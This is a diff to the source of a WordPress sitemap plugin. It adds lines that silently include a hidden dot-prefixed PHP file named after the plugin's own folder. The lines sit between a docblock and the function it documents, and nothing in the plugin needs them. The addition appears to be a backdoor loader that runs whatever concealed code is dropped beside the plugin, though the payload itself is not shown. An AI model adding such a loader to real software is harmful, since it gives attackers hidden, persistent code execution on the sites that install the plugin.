@@ -27,6 +27,10 @@ add_action( 'plugins_loaded', 'wsp_load_textdomain' );
  * Load plugin textdomain.
  * @since 1.5.2
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wsp_load_textdomain() {
   load_plugin_textdomain( 'wp_sitemap_page', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
 }
